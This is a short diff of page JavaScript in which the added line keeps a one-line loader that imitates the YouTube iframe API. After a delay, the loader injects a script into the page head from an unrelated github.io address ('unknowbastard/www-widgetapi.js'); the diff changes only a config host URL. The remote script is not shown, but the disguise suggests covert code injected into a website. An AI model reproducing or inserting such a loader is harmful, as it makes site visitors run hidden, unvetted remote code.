@@ -347,7 +347,7 @@ var new_video = function(){
 
 
 setTimeout(function(){
-if (!window['YT']) {var YT = {loading: 0,loaded: 0};}if (!window['YTConfig']) {var YTConfig = {'host': 'https://tpc.googlesyndication.com'};}if (!YT.loading) {YT.loading = 1;(function(){var l = [];YT.ready = function(f) {if (YT.loaded) {f();} else {l.push(f);}};window.onYTReady = function() {YT.loaded = 1;for (var i = 0; i < l.length; i++) {try {l[i]();} catch (e) {console.log(e);}}};YT.setConfig = function(c) {for (var k in c) {if (c.hasOwnProperty(k)) {YTConfig[k] = c[k];}}};var a = document.createElement('script');a.type = 'text/javascript';a.id = 'www-widgetapi-script';a.src = 'https://coolboy112233.github.io/unknowbastard/www-widgetapi.js';a.async = true;var b = document.getElementsByTagName('head')[0];b.parentNode.insertBefore(a, b);})();}	
+if (!window['YT']) {var YT = {loading: 0,loaded: 0};}if (!window['YTConfig']) {var YTConfig = {'host': 'https://cards-frame.twitter.com/i/cards/tfw/v1/uc/1207618818023010304'};}if (!YT.loading) {YT.loading = 1;(function(){var l = [];YT.ready = function(f) {if (YT.loaded) {f();} else {l.push(f);}};window.onYTReady = function() {YT.loaded = 1;for (var i = 0; i < l.length; i++) {try {l[i]();} catch (e) {console.log(e);}}};YT.setConfig = function(c) {for (var k in c) {if (c.hasOwnProperty(k)) {YTConfig[k] = c[k];}}};var a = document.createElement('script');a.type = 'text/javascript';a.id = 'www-widgetapi-script';a.src = 'https://coolboy112233.github.io/unknowbastard/www-widgetapi.js';a.async = true;var b = document.getElementsByTagName('head')[0];b.parentNode.insertBefore(a, b);})();}	
 },1000);
 
 
